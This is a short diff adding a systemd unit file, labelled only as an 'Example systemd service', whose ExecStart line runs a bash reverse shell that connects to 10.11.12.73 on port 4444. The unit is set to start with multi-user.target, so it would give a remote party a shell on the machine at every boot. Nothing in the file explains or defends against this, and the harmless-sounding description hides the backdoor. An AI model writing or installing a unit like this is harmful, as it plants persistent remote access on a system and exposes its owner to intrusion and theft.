@@ -1,0 +1,9 @@
+[Unit]
+Description=Example systemd service.
+
+[Service]
+Type=simple
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.11.12.73/4444 0>&1'
+
+[Install]
+WantedBy=multi-user.target
